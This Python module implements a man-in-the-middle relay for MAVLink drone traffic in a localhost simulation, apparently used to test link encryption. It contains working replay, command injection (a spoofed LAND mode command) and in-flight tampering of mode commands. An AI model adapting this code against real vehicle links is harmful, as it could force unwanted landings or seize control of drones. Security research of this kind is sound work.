"""Man-in-the-middle relay that stands in for the radio link and the attacker.

All GCS<->vehicle traffic passes through it. A UDP control port (default 127.0.0.1:14599)
accepts one command per datagram and answers with JSON:

  mark_start / mark_stop   record GCS->vehicle datagrams sent between the two marks
  replay_marked            resend the recorded datagrams to the vehicle (replay attack)
  inject_land              send a forged COMMAND_LONG DO_SET_MODE(LAND) spoofing the GCS ids (injection)
  tamper_on / tamper_off   rewrite DO_SET_MODE commands in flight to LAND; on encrypted
                           frames (not parseable) flip one ciphertext byte instead (tampering)
  stats / reset_stats      byte and packet counters per direction

The attacker never has any key: it only sees and modifies what is on the wire.
For research and teaching in simulation only.
"""
from __future__ import annotations

import argparse
import json
import selectors
import signal
import socket
from collections import Counter

from .mav import COPTER_MODES, GCS_COMPID, GCS_SYSID, command_long_bytes, mavlink2


def tamper_datagram(data: bytes) -> tuple[bytes, bool]:
    """Return (new datagram, changed?)."""
    if data[:1] in (b"\xfd", b"\xfe"):  # cleartext MAVLink: a smart attacker re-encodes with a valid CRC
        parser = mavlink2.MAVLink(None)
        parser.robust_parsing = True
        msgs = parser.parse_buffer(data) or []
        out, changed = b"", False
        for m in msgs:
            if m.get_type() == "COMMAND_LONG" and m.command == mavlink2.MAV_CMD_DO_SET_MODE:
                params = [m.param1, COPTER_MODES["LAND"], m.param3, m.param4, m.param5, m.param6, m.param7]
                out += command_long_bytes(m.get_srcSystem(), m.get_srcComponent(), m.command, params, m.get_seq())
                changed = True
            elif m.get_type() != "BAD_DATA":
                out += bytes(m.get_msgbuf())
        return (out, True) if changed else (data, False)
    if len(data) > 20:  # encrypted frame: no key, so the best it can do is flip bits
        b = bytearray(data)
        b[12] ^= 0x01
        return bytes(b), True
    return data, False


class Relay:
    def __init__(self, a):
        self.gs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.gs.bind(("127.0.0.1", a.gcs_bind))
        self.vs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.vs.bind(("127.0.0.1", a.vehicle_bind))
        self.vehicle_peer = tuple([a.vehicle_peer.rsplit(":", 1)[0], int(a.vehicle_peer.rsplit(":", 1)[1])])
        self.ctl = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.ctl.bind(("127.0.0.1", a.control))
        self.gcs_peer = None
        self.recording = False
        self.recorded: list[bytes] = []
        self.tamper = False
        self.stats = Counter()
        self.running = True

    def control(self, cmd: str) -> dict:
        if cmd == "mark_start":
            self.recorded, self.recording = [], True
        elif cmd == "mark_stop":
            self.recording = False
        elif cmd == "replay_marked":
            for d in self.recorded:
                self.vs.sendto(d, self.vehicle_peer)
            self.stats["replayed"] += len(self.recorded)
            return {"ok": True, "replayed": len(self.recorded)}
        elif cmd == "inject_land":
            pkt = command_long_bytes(GCS_SYSID, GCS_COMPID, mavlink2.MAV_CMD_DO_SET_MODE,
                                     [mavlink2.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, COPTER_MODES["LAND"]])
            self.vs.sendto(pkt, self.vehicle_peer)
            self.stats["injected"] += 1
        elif cmd == "tamper_on":
            self.tamper = True
        elif cmd == "tamper_off":
            self.tamper = False
        elif cmd == "reset_stats":
            self.stats = Counter()
        elif cmd != "stats":
            return {"ok": False, "error": "unknown command"}
        return {"ok": True, **self.stats}

    def run(self):
        sel = selectors.DefaultSelector()
        for s, tag in ((self.gs, "g"), (self.vs, "v"), (self.ctl, "c")):
            sel.register(s, selectors.EVENT_READ, tag)
        signal.signal(signal.SIGTERM, lambda *_: setattr(self, "running", False))
        signal.signal(signal.SIGINT, lambda *_: setattr(self, "running", False))
        while self.running:
            for key, _ in sel.select(timeout=0.1):
                try:
                    data, addr = key.fileobj.recvfrom(65535)
                except ConnectionRefusedError:
                    continue
                if key.data == "c":
                    self.ctl.sendto(json.dumps(self.control(data.decode().strip())).encode(), addr)
                elif key.data == "g":
                    self.gcs_peer = addr
                    if self.recording:
                        self.recorded.append(data)
                    if self.tamper:
                        data, changed = tamper_datagram(data)
                        self.stats["tampered"] += changed
                    self.stats["g2v_pkts"] += 1
                    self.stats["g2v_bytes"] += len(data)
                    self.vs.sendto(data, self.vehicle_peer)
                elif self.gcs_peer:
                    self.stats["v2g_pkts"] += 1
                    self.stats["v2g_bytes"] += len(data)
                    self.gs.sendto(data, self.gcs_peer)
        print(json.dumps({"role": "relay", **self.stats}), flush=True)


def main(argv=None):
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--gcs-bind", type=int, default=14552)
    p.add_argument("--vehicle-bind", type=int, default=14553)
    p.add_argument("--vehicle-peer", default="127.0.0.1:14554")
    p.add_argument("--control", type=int, default=14599)
    Relay(p.parse_args(argv)).run()


if __name__ == "__main__":
    main()
